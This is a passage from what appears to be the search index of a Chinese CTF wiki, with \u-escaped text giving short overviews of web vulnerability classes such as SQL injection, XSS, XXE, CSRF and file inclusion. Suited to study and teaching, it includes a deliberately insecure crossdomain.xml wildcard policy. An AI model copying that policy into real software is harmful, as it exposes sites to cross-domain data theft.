\u670d\u52a1\u5668\u7684\u63a7\u5236\u6743\u9650\uff0c\u8f7b\u5219\u7be1\u6539\u7f51\u9875\u5185\u5bb9\uff0c\u91cd\u5219\u7a83\u53d6\u91cd\u8981\u5185\u90e8\u6570\u636e\uff0c\u66f4\u4e3a\u4e25\u91cd\u7684\u5219\u662f\u5728\u7f51\u9875\u4e2d\u690d\u5165\u6076\u610f\u4ee3\u7801\uff0c\u4f7f\u5f97\u7f51\u7ad9\u8bbf\u95ee\u8005\u53d7\u5230\u4fb5\u5bb3\u3002</p> <p>\u5728 CTF \u7ade\u8d5b\u4e2d\uff0cWEB \u4e5f\u662f\u5360\u6bd4\u91cd\u5f88\u5927\u7684\u4e00\u4e2a\u65b9\u5411\u4e4b\u4e00\uff0cWEB \u7c7b\u7684\u9898\u76ee\u79cd\u7c7b\u7e41\u591a\uff0c\u77e5\u8bc6\u70b9\u7ec6\u788e\uff0c\u65f6\u6548\u6027\u5f3a\uff0c\u80fd\u7d27\u8ddf\u65f6\u4e0b\u70ed\u70b9\u6f0f\u6d1e\uff0c\u8d34\u8fd1\u5b9e\u6218\u3002</p> <p>WEB \u7c7b\u7684\u9898\u76ee\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1aSQL \u6ce8\u5165\u3001XSS \u8de8\u7ad9\u811a\u672c\u3001CSRF \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u3001\u6587\u4ef6\u4e0a\u4f20\u3001\u6587\u4ef6\u5305\u542b\u3001\u6846\u67b6\u5b89\u5168\u3001PHP \u5e38\u89c1\u6f0f\u6d1e\u3001\u4ee3\u7801\u5ba1\u8ba1\u7b49\u3002</p>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/#sql","title":"SQL \u6ce8\u5165\u00b6","text":"<p>\u901a\u8fc7\u5728\u7528\u6237\u53ef\u63a7\u53c2\u6570\u4e2d\u6ce8\u5165 SQL \u8bed\u6cd5\uff0c\u7834\u574f\u539f\u6709 SQL \u7ed3\u6784\uff0c\u8fbe\u5230\u7f16\u5199\u7a0b\u5e8f\u65f6\u610f\u6599\u4e4b\u5916\u7ed3\u679c\u7684\u653b\u51fb\u884c\u4e3a\u3002\u5176\u6210\u56e0\u53ef\u4ee5\u5f52\u7ed3\u4e3a\u4ee5\u4e0b\u4e24\u4e2a\u539f\u56e0\u53e0\u52a0\u9020\u6210\u7684\uff1a</p> <ol> <li>\u7a0b\u5e8f\u7f16\u5199\u8005\u5728\u5904\u7406\u5e94\u7528\u7a0b\u5e8f\u548c\u6570\u636e\u5e93\u4ea4\u4e92\u65f6\uff0c\u4f7f\u7528\u5b57\u7b26\u4e32\u62fc\u63a5\u7684\u65b9\u5f0f\u6784\u9020 SQL \u8bed\u53e5</li> <li>\u672a\u5bf9\u7528\u6237\u53ef\u63a7\u53c2\u6570\u8fdb\u884c\u8db3\u591f\u7684\u8fc7\u6ee4\u4fbf\u5c06\u53c2\u6570\u5185\u5bb9\u62fc\u63a5\u8fdb\u5165\u5230 SQL \u8bed\u53e5\u4e2d</li> </ol>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/#xss","title":"XSS \u8de8\u7ad9\u811a\u672c\u653b\u51fb\u00b6","text":"<p>\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff08Cross Site Scripting\uff09\uff0c\u4e3a\u4e0d\u548c\u5c42\u53e0\u6837\u5f0f\u8868\uff08Cascading Style Sheets\uff0cCSS\uff09\u7684\u7f29\u5199\u6df7\u6dc6\uff0c\u6545\u5c06\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u7f29\u5199\u4e3a XSS\u3002\u6076\u610f\u653b\u51fb\u8005\u5f80 WEB \u9875\u9762\u91cc\u63d2\u5165\u6076\u610f HTML \u4ee3\u7801\uff0c\u5f53\u7528\u6237\u6d4f\u89c8\u8be5\u9875\u4e4b\u65f6\uff0c\u5d4c\u5165\u5176\u4e2d Web \u91cc\u9762\u7684 HTML \u4ee3\u7801\u4f1a\u88ab\u6267\u884c\uff0c\u4ece\u800c\u8fbe\u5230\u6076\u610f\u653b\u51fb\u7528\u6237\u7684\u7279\u6b8a\u76ee\u7684\u3002</p>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/#_1","title":"\u547d\u4ee4\u6267\u884c\u00b6","text":"<p>\u5f53\u5e94\u7528\u9700\u8981\u8c03\u7528\u4e00\u4e9b\u5916\u90e8\u7a0b\u5e8f\u53bb\u5904\u7406\u5185\u5bb9\u7684\u60c5\u51b5\u4e0b\uff0c\u5c31\u4f1a\u7528\u5230\u4e00\u4e9b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u51fd\u6570\u3002\u5982 PHP \u4e2d\u7684<code>system</code>\u3001<code>exec</code>\u3001<code>shell_exec</code>\u7b49\uff0c\u5f53\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u547d\u4ee4\u6267\u884c\u51fd\u6570\u4e2d\u7684\u53c2\u6570\u65f6\uff0c\u5c06\u53ef\u4ee5\u6ce8\u5165\u6076\u610f\u7cfb\u7edf\u547d\u4ee4\u5230\u6b63\u5e38\u547d\u4ee4\u4e2d\uff0c\u9020\u6210\u547d\u4ee4\u6267\u884c\u653b\u51fb\u3002\u8fd9\u91cc\u8fd8\u662f\u4e3b\u8981\u4ee5 PHP \u4e3a\u4e3b\u4ecb\u7ecd\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0cJava \u7b49\u5e94\u7528\u7684\u7ec6\u8282\u5f85\u8865\u5145\u3002</p>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/#_2","title":"\u6587\u4ef6\u5305\u542b\u00b6","text":"<p>\u5982\u679c\u5141\u8bb8\u5ba2\u6237\u7aef\u7528\u6237\u8f93\u5165\u63a7\u5236\u52a8\u6001\u5305\u542b\u5728\u670d\u52a1\u5668\u7aef\u7684\u6587\u4ef6\uff0c\u4f1a\u5bfc\u81f4\u6076\u610f\u4ee3\u7801\u7684\u6267\u884c\u53ca\u654f\u611f\u4fe1\u606f\u6cc4\u9732\uff0c\u4e3b\u8981\u5305\u62ec\u672c\u5730\u6587\u4ef6\u5305\u542b\u548c\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u4e24\u79cd\u5f62\u5f0f\u3002</p>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/#csrf","title":"CSRF \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u00b6","text":"<p>\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff08Cross-Site Request Forgery\uff0cCSRF\uff09\u662f\u4e00\u79cd\u4f7f\u5df2\u767b\u5f55\u7528\u6237\u5728\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u67d0\u79cd\u52a8\u4f5c\u7684\u653b\u51fb\u3002\u56e0\u4e3a\u653b\u51fb\u8005\u770b\u4e0d\u5230\u4f2a\u9020\u8bf7\u6c42\u7684\u54cd\u5e94\u7ed3\u679c\uff0c\u6240\u4ee5 CSRF \u653b\u51fb\u4e3b\u8981\u7528\u6765\u6267\u884c\u52a8\u4f5c\uff0c\u800c\u975e\u7a83\u53d6\u7528\u6237\u6570\u636e\u3002\u5f53\u53d7\u5bb3\u8005\u662f\u4e00\u4e2a\u666e\u901a\u7528\u6237\u65f6\uff0cCSRF \u53ef\u4ee5\u5b9e\u73b0\u5728\u5176\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u8f6c\u79fb\u7528\u6237\u8d44\u91d1\u3001\u53d1\u9001\u90ae\u4ef6\u7b49\u64cd\u4f5c\uff1b\u4f46\u662f\u5982\u679c\u53d7\u5bb3\u8005\u662f\u4e00\u4e2a\u5177\u6709\u7ba1\u7406\u5458\u6743\u9650\u7684\u7528\u6237\u65f6 CSRF \u5219\u53ef\u80fd\u5a01\u80c1\u5230\u6574\u4e2a WEB \u7cfb\u7edf\u7684\u5b89\u5168\u3002</p>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/#ssrf","title":"SSRF \u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\u00b6","text":"<p>SSRF\uff08Server-Side Request Forgery\uff1a\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\uff09\u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF \u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u90e8\u7cfb\u7edf\u3002</p>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/#_3","title":"\u6587\u4ef6\u4e0a\u4f20\u00b6","text":"<p>\u5728\u7f51\u7ad9\u7684\u8fd0\u8425\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u53ef\u907f\u514d\u5730\u8981\u5bf9\u7f51\u7ad9\u7684\u67d0\u4e9b\u9875\u9762\u6216\u8005\u5185\u5bb9\u8fdb\u884c\u66f4\u65b0\uff0c\u8fd9\u65f6\u4fbf\u9700\u8981\u4f7f\u7528\u5230\u7f51\u7ad9\u7684\u6587\u4ef6\u4e0a\u4f20\u7684\u529f\u80fd\u3002\u5982\u679c\u4e0d\u5bf9\u88ab\u4e0a\u4f20\u7684\u6587\u4ef6\u8fdb\u884c\u9650\u5236\u6216\u8005\u9650\u5236\u88ab\u7ed5\u8fc7\uff0c\u8be5\u529f\u80fd\u4fbf\u6709\u53ef\u80fd\u4f1a\u88ab\u5229\u7528\u4e8e\u4e0a\u4f20\u53ef\u6267\u884c\u6587\u4ef6\u3001\u811a\u672c\u5230\u670d\u52a1\u5668\u4e0a\uff0c\u8fdb\u800c\u8fdb\u4e00\u6b65\u5bfc\u81f4\u670d\u52a1\u5668\u6ca6\u9677\u3002</p>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/#_4","title":"\u70b9\u51fb\u52ab\u6301\u00b6","text":"<p>Clickjacking\uff08\u70b9\u51fb\u52ab\u6301\uff09\u662f\u7531\u4e92\u8054\u7f51\u5b89\u5168\u4e13\u5bb6\u7f57\u4f2f\u7279 \u00b7 \u6c49\u68ee\u548c\u8036\u5229\u7c73 \u00b7 \u683c\u52b3\u65af\u66fc\u5728 2008 \u5e74\u9996\u521b\u7684\u3002</p> <p>\u662f\u4e00\u79cd\u89c6\u89c9\u6b3a\u9a97\u624b\u6bb5\uff0c\u5728 WEB \u7aef\u5c31\u662f iframe \u5d4c\u5957\u4e00\u4e2a\u900f\u660e\u4e0d\u53ef\u89c1\u7684\u9875\u9762\uff0c\u8ba9\u7528\u6237\u5728\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\uff0c\u70b9\u51fb\u653b\u51fb\u8005\u60f3\u8981\u6b3a\u9a97\u7528\u6237\u70b9\u51fb\u7684\u4f4d\u7f6e\u3002</p> <p>\u7531\u4e8e\u70b9\u51fb\u52ab\u6301\u7684\u51fa\u73b0\uff0c\u4fbf\u51fa\u73b0\u4e86\u53cd frame \u5d4c\u5957\u7684\u65b9\u5f0f\uff0c\u56e0\u4e3a\u70b9\u51fb\u52ab\u6301\u9700\u8981 iframe \u5d4c\u5957\u9875\u9762\u6765\u653b\u51fb\u3002</p> <p>\u4e0b\u9762\u4ee3\u7801\u662f\u6700\u5e38\u89c1\u7684\u9632\u6b62 frame \u5d4c\u5957\u7684\u4f8b\u5b50\uff1a</p> <pre><code>if(top.location!=location)\ntop.location=self.location;\n</code></pre>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/#vps","title":"VPS \u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\u00b6","text":"<p>VPS\uff08Virtual Private Server \u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\uff09\u6280\u672f\uff0c\u5c06\u4e00\u90e8\u670d\u52a1\u5668\u5206\u5272\u6210\u591a\u4e2a\u865a\u62df\u4e13\u4eab\u670d\u52a1\u5668\u7684\u4f18\u8d28\u670d\u52a1\u3002\u5b9e\u73b0 VPS \u7684\u6280\u672f\u5206\u4e3a\u5bb9\u5668\u6280\u672f\uff0c\u548c\u865a\u62df\u5316\u6280\u672f\u3002\u5728\u5bb9\u5668\u6216\u865a\u62df\u673a\u4e2d\uff0c\u6bcf\u4e2a VPS \u90fd\u53ef\u5206\u914d\u72ec\u7acb\u516c\u7f51 IP \u5730\u5740\u3001\u72ec\u7acb\u64cd\u4f5c\u7cfb\u7edf\u3001\u5b9e\u73b0\u4e0d\u540c VPS \u95f4\u78c1\u76d8\u7a7a\u95f4\u3001\u5185\u5b58\u3001CPU \u8d44\u6e90\u3001\u8fdb\u7a0b\u548c\u7cfb\u7edf\u914d\u7f6e\u7684\u9694\u79bb\uff0c\u4e3a\u7528\u6237\u548c\u5e94\u7528\u7a0b\u5e8f\u6a21\u62df\u51fa\u72ec\u5360\u4f7f\u7528\u8ba1\u7b97\u8d44\u6e90\u7684\u4f53\u9a8c\u3002VPS \u53ef\u4ee5\u50cf\u72ec\u7acb\u670d\u52a1\u5668\u4e00\u6837\uff0c\u91cd\u88c5\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5b89\u88c5\u7a0b\u5e8f\uff0c\u5355\u72ec\u91cd\u542f\u670d\u52a1\u5668\u3002VPS \u4e3a\u4f7f\u7528\u8005\u63d0\u4f9b\u4e86\u7ba1\u7406\u914d\u7f6e\u7684\u81ea\u7531\uff0c\u53ef\u7528\u4e8e\u4f01\u4e1a\u865a\u62df\u5316\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e IDC \u8d44\u6e90\u79df\u7528\u3002</p> <p>IDC \u8d44\u6e90\u79df\u7528\uff0c\u7531 VPS \u63d0\u4f9b\u5546\u63d0\u4f9b\u3002\u4e0d\u540c VPS \u63d0\u4f9b\u5546\u6240\u4f7f\u7528\u7684\u786c\u4ef6 VPS \u8f6f\u4ef6\u7684\u5dee\u5f02\uff0c\u53ca\u9500\u552e\u7b56\u7565\u7684\u4e0d\u540c\uff0cVPS \u7684\u4f7f\u7528\u4f53\u9a8c\u4e5f\u6709\u8f83\u5927\u5dee\u5f02\u3002\u5c24\u5176\u662f VPS \u63d0\u4f9b\u5546\u8d85\u5356\uff0c\u5bfc\u81f4\u5b9e\u4f53\u670d\u52a1\u5668\u8d85\u8d1f\u8377\u65f6\uff0cVPS \u6027\u80fd\u5c06\u53d7\u5230\u6781\u5927\u5f71\u54cd\u3002\u76f8\u5bf9\u6765\u8bf4\uff0c\u5bb9\u5668\u6280\u672f\u6bd4\u865a\u62df\u673a\u6280\u672f\u786c\u4ef6\u4f7f\u7528\u6548\u7387\u66f4\u9ad8\uff0c\u66f4\u6613\u4e8e\u8d85\u5356\uff0c\u6240\u4ee5\u4e00\u822c\u6765\u8bf4\u5bb9\u5668 VPS \u7684\u4ef7\u683c\u90fd\u4f4e\u4e8e\u865a\u62df\u673a VPS \u7684\u4ef7\u683c\u3002</p>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/#_5","title":"\u6761\u4ef6\u7ade\u4e89\u00b6","text":"<p>\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u662f\u4e00\u79cd\u670d\u52a1\u5668\u7aef\u7684\u6f0f\u6d1e\uff0c\u7531\u4e8e\u670d\u52a1\u5668\u7aef\u5728\u5904\u7406\u4e0d\u540c\u7528\u6237\u7684\u8bf7\u6c42\u65f6\u662f\u5e76\u53d1\u8fdb\u884c\u7684\uff0c\u56e0\u6b64\uff0c\u5982\u679c\u5e76\u53d1\u5904\u7406\u4e0d\u5f53\u6216\u76f8\u5173\u64cd\u4f5c\u903b\u8f91\u987a\u5e8f\u8bbe\u8ba1\u7684\u4e0d\u5408\u7406\u65f6\uff0c\u5c06\u4f1a\u5bfc\u81f4\u6b64\u7c7b\u95ee\u9898\u7684\u53d1\u751f\u3002</p>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/#xxe","title":"XXE\u00b6","text":"<p>XXE Injection \u5373 XML External Entity Injection\uff0c\u4e5f\u5c31\u662f XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u653b\u51fb. \u6f0f\u6d1e\u662f\u5728\u5bf9\u975e\u5b89\u5168\u7684\u5916\u90e8\u5b9e\u4f53\u6570\u636e\u8fdb\u2f8f\u884c\u5904\u7406\u65f6\u5f15\u53d1\u7684\u5b89\u5168\u95ee\u9898\u3002</p> <p>\u5728 XML 1.0 \u6807\u51c6\u91cc\uff0cXML \u6587\u6863\u7ed3\u6784\u2fa5\u91cc\u5b9a\u4e49\u4e86\u5b9e\u4f53\uff08entity\uff09\u8fd9\u4e2a\u6982\u5ff5. \u5b9e\u4f53\u53ef\u4ee5\u901a\u8fc7\u9884\u5b9a\u4e49\u5728\u6587\u6863\u4e2d\u8c03\u7528\uff0c\u5b9e\u4f53\u7684\u6807\u8bc6\u7b26\u53ef\u8bbf\u95ee\u672c\u5730\u6216\u8fdc\u7a0b\u5185\u5bb9. \u5982\u679c\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5f15\u5165\u4e86\u300c\u6c61\u67d3\u300d\u6e90\uff0c\u5728\u5bf9 XML \u6587\u6863\u5904\u7406\u540e\u5219\u53ef\u80fd\u5bfc\u81f4\u4fe1\u606f\u6cc4\u6f0f\u7b49\u5b89\u5168\u95ee\u9898\u3002</p>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/#xsch","title":"XSCH\u00b6","text":"<p>\u7531\u4e8e\u7f51\u7ad9\u5f00\u53d1\u8005\u5728\u4f7f\u7528 Flash\u3001Silverlight \u7b49\u8fdb\u884c\u5f00\u53d1\u7684\u8fc7\u7a0b\u4e2d\u7684\u758f\u5ffd\uff0c\u6ca1\u6709\u5bf9\u8de8\u57df\u7b56\u7565\u6587\u4ef6\uff08crossdomain.xml\uff09\u8fdb\u884c\u6b63\u786e\u7684\u914d\u7f6e\u5bfc\u81f4\u95ee\u9898\u4ea7\u751f\u3002 \u4f8b\u5982\uff1a</p> <p><pre><code>&lt;cross-domain-policy&gt;\n&lt;allow-access-from domain=\u201c*\u201d/&gt;\n&lt;/cross-domain-policy&gt;\n</code></pre> \u56e0\u4e3a\u8de8\u57df\u7b56\u7565\u6587\u4ef6\u914d\u7f6e\u4e3a<code>*</code>\uff0c\u4e5f\u5c31\u6307\u4efb\u610f\u57df\u7684 Flash \u90fd\u53ef\u4ee5\u4e0e\u5b83\u4ea4\u4e92\uff0c\u5bfc\u81f4\u53ef\u4ee5\u53d1\u8d77\u8bf7\u6c42\u3001\u83b7\u53d6\u6570\u636e\u3002</p>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/#_6","title":"\u8d8a\u6743\uff08\u529f\u80fd\u7ea7\u8bbf\u95ee\u7f3a\u5931\uff09\u00b6","text":"<p>\u8d8a\u6743\u6f0f\u6d1e\u662f WEB \u5e94\u7528\u7a0b\u5e8f\u4e2d\u4e00\u79cd\u5e38\u89c1\u7684\u5b89\u5168\u6f0f\u6d1e\u3002\u5b83\u7684\u5a01\u80c1\u5728\u4e8e\u4e00\u4e2a\u8d26\u6237\u5373\u53ef\u63a7\u5236\u5168\u7ad9\u7528\u6237\u6570\u636e\u3002\u5f53\u7136\u8fd9\u4e9b\u6570\u636e\u4ec5\u9650\u4e8e\u5b58\u5728\u6f0f\u6d1e\u529f\u80fd\u5bf9\u5e94\u7684\u6570\u636e\u3002\u8d8a\u6743\u6f0f\u6d1e\u7684\u6210\u56e0\u4e3b\u8981\u662f\u56e0\u4e3a\u5f00\u53d1\u4eba\u5458\u5728\u5bf9\u6570\u636e\u8fdb\u884c\u589e\u3001\u5220\u3001\u6539\u3001\u67e5\u8be2\u65f6\u5bf9\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u6570\u636e\u8fc7\u5206\u76f8\u4fe1\u800c\u9057\u6f0f\u4e86\u6743\u9650\u7684\u5224\u5b9a\u3002\u6240\u4ee5\u6d4b\u8bd5\u8d8a\u6743\u5c31\u662f\u548c\u5f00\u53d1\u4eba\u5458\u62fc\u7ec6\u5fc3\u7684\u8fc7\u7a0b\u3002</p>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/#_7","title":"\u654f\u611f\u4fe1\u606f\u6cc4\u9732\u00b6","text":"<p>\u654f\u611f\u4fe1\u606f\u6307\u4e0d\u4e3a\u516c\u4f17\u6240\u77e5\u6089\uff0c\u5177\u6709\u5b9e\u9645\u548c\u6f5c\u5728\u5229\u7528\u4ef7\u503c\uff0c\u4e22\u5931\u3001\u4e0d\u5f53\u4f7f\u7528\u6216\u672a\u7ecf\u6388\u6743\u8bbf\u95ee\u5bf9\u793e\u4f1a\u3001\u4f01\u4e1a\u6216\u4e2a\u4eba\u9020\u6210\u5371\u5bb3\u7684\u4fe1\u606f\u3002\u5305\u62ec\uff1a\u4e2a\u4eba\u9690\u79c1\u4fe1\u606f\u3001\u4e1a\u52a1\u7ecf\u8425\u4fe1\u606f\u3001\u8d22\u52a1\u4fe1\u606f\u3001\u4eba\u4e8b\u4fe1\u606f\u3001IT \u8fd0\u7ef4\u4fe1\u606f\u7b49\u3002 \u6cc4\u9732\u9014\u5f84\u5305\u62ec Github\u3001\u767e\u5ea6\u6587\u5e93\u3001Google code\u3001\u7f51\u7ad9\u76ee\u5f55\u7b49\u3002</p>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/#_8","title":"\u9519\u8bef\u7684\u5b89\u5168\u914d\u7f6e\u00b6","text":"<p>Security Misconfiguration\uff1a\u6709\u65f6\u5019\uff0c\u4f7f\u7528\u9ed8\u8ba4\u7684\u5b89\u5168\u914d\u7f6e\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5e94\u7528\u7a0b\u5e8f\u5bb9\u6613\u906d\u53d7\u591a\u79cd\u653b\u51fb\u3002\u5728\u5df2\u7ecf\u90e8\u7f72\u7684\u5e94\u7528\u3001WEB \u670d\u52a1\u5668\u3001\u6570\u636e\u5e93\u670d\u52a1\u5668\u3001\u64cd\u4f5c\u7cfb\u7edf\u3001\u4ee3\u7801\u5e93\u4ee5\u53ca\u6240\u6709\u548c\u5e94\u7528\u7a0b\u5e8f\u76f8\u5173\u7684\u7ec4\u4ef6\u4e2d\uff0c\u90fd\u5e94\u8be5\u4f7f\u7528\u73b0\u6709\u7684\u6700\u4f73\u5b89\u5168\u914d\u7f6e\uff0c\u8fd9\u4e00\u70b9\u81f3\u5173\u91cd\u8981\u3002</p>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/#waf","title":"WAF\u00b6","text":"<p>Web \u5e94\u7528\u9632\u62a4\u7cfb\u7edf\uff08\u4e5f\u79f0\uff1a\u7f51\u7ad9\u5e94\u7528\u7ea7\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\u3002\u82f1\u6587\uff1aWeb Application Firewall\uff0c\u7b80\u79f0\uff1aWAF\uff09\u3002\u5229\u7528\u56fd\u9645\u4e0a\u516c\u8ba4\u7684\u4e00\u79cd\u8bf4\u6cd5\uff1aWEB \u5e94\u7528\u9632\u706b\u5899\u662f\u901a\u8fc7\u6267\u884c\u4e00\u7cfb\u5217\u9488\u5bf9 HTTP/HTTPS \u7684\u5b89\u5168\u7b56\u7565\u6765\u4e13\u95e8\u4e3a WEB \u5e94\u7528\u63d0\u4f9b\u4fdd\u62a4\u7684\u4e00\u6b3e\u4ea7\u54c1\u3002</p>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/#ids","title":"IDS\u00b6","text":"<p>IDS \u662f\u82f1\u6587 Intrusion Detection Systems \u7684\u7f29\u5199\uff0c\u4e2d\u6587\u610f\u601d\u662f\u300c\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\u300d\u3002\u4e13\u4e1a\u4e0a\u8bb2\u5c31\u662f\u4f9d\u7167\u4e00\u5b9a\u7684\u5b89\u5168\u7b56\u7565\uff0c\u901a\u8fc7\u8f6f\u3001\u786c\u4ef6\uff0c\u5bf9\u7f51\u7edc\u3001\u7cfb\u7edf\u7684\u8fd0\u884c\u72b6\u51b5\u8fdb\u884c\u76d1\u89c6\uff0c\u5c3d\u53ef\u80fd\u53d1\u73b0\u5404\u79cd\u653b\u51fb\u4f01\u56fe\u3001\u653b\u51fb\u884c\u4e3a\u6216\u8005\u653b\u51fb\u7ed3\u679c\uff0c\u4ee5\u4fdd\u8bc1\u7f51\u7edc\u7cfb\u7edf\u8d44\u6e90\u7684\u673a\u5bc6\u6027\u3001\u5b8c\u6574\u6027\u548c\u53ef\u7528\u6027\u3002\u505a\u4e00\u4e2a\u5f62\u8c61\u7684\u6bd4\u55bb\uff1a\u5047\u5982\u9632\u706b\u5899\u662f\u4e00\u5e62\u5927\u697c\u7684\u95e8\u9501\uff0c\u90a3\u4e48 IDS \u5c31\u662f\u8fd9\u5e62\u5927\u697c\u91cc\u7684\u76d1\u89c6\u7cfb\u7edf\u3002\u4e00\u65e6\u5c0f\u5077\u722c\u7a97\u8fdb\u5165\u5927\u697c\uff0c\u6216\u5185\u90e8\u4eba\u5458\u6709\u8d8a\u754c\u884c\u4e3a\uff0c\u53ea\u6709\u5b9e\u65f6\u76d1\u89c6\u7cfb\u7edf\u624d\u80fd\u53d1\u73b0\u60c5\u51b5\u5e76\u53d1\u51fa\u8b66\u544a\u3002</p>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/#ips","title":"IPS\u00b6","text":"<p>\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\uff08IPS\uff1aIntrusion Prevention System\uff09\u662f\u7535\u8111\u7f51\u7edc\u5b89\u5168\u8bbe\u65bd\uff0c\u662f\u5bf9\u9632\u75c5\u6bd2\u8f6f\u4ef6\uff08Antivirus Programs\uff09\u548c\u9632\u706b\u5899\uff08Packet Filter\uff0cApplication Gateway\uff09\u7684\u8865\u5145\u3002\u5165\u4fb5\u9884\u9632\u7cfb\u7edf\uff08Intrusion-prevention system\uff09\u662f\u4e00\u90e8\u80fd\u591f\u76d1\u89c6\u7f51\u7edc\u6216\u7f51\u7edc\u8bbe\u5907\u7684\u7f51\u7edc\u8d44\u6599\u4f20\u8f93\u884c\u4e3a\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\uff0c\u80fd\u591f\u5373\u65f6\u7684\u4e2d\u65ad\u3001\u8c03\u6574\u6216\u9694\u79bb\u4e00\u4e9b\u4e0d\u6b63\u5e38\u6216\u662f\u5177\u6709\u4f24\u5bb3\u6027\u7684\u7f51\u7edc\u8d44\u6599\u4f20\u8f93\u884c\u4e3a\u3002</p>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/#_9","title":"\u53c2\u8003\u8d44\u6599\u00b6","text":"<ul> <li>WEB \u6e17\u900f Wiki</li> </ul>"},{"location":"web_bak/include/include_normal/","title":"\u6587\u4ef6\u5305\u542b","text":""},{"location":"web_bak/include/include_normal/#_2","title":"\u4ec0\u4e48\u662f\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e","text":"<p>\u901a\u8fc7PHP\u51fd\u6570\u5f15\u5165\u6587\u4ef6\u65f6\uff0c\u4f20\u5165\u7684\u6587\u4ef6\u540d\u6ca1\u6709\u7ecf\u8fc7\u5408\u7406\u7684\u9a8c\u8bc1\uff0c\u4ece\u800c\u64cd\u4f5c\u4e86\u9884\u60f3\u4e4b\u5916\u7684\u6587\u4ef6\uff0c\u5c31\u53ef\u80fd\u5bfc\u81f4\u610f\u5916\u7684\u6587\u4ef6\u6cc4\u6f0f\u751a\u81f3\u6076\u610f\u4ee3\u7801\u6ce8\u5165\u3002</p>"},{"location":"web_bak/include/include_normal/#_3","title":"\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u7684\u73af\u5883\u8981\u6c42","text":"<p>allow_url_fopen=On(\u9ed8\u8ba4\u4e3aOn) \u89c4\u5b9a\u662f\u5426\u5141\u8bb8\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u6216\u8005\u7f51\u7ad9\u68c0\u7d22\u6570\u636e</p> <ul> <li> <p>allow_url_include=On(php5.2\u4e4b\u540e\u9ed8\u8ba4\u4e3aOff) \u89c4\u5b9a\u662f\u5426\u5141\u8bb8include/require\u8fdc\u7a0b\u6587\u4ef6</p> </li> <li></li> </ul>"},{"location":"web_bak/include/include_normal/#_4","title":"\u5e38\u89c1\u6587\u4ef6\u5305\u542b\u51fd\u6570","text":"<p>php\u4e2d\u5e38\u89c1\u7684\u6587\u4ef6\u5305\u542b\u51fd\u6570\u6709\u4ee5\u4e0b\u56db\u79cd\uff1a</p> 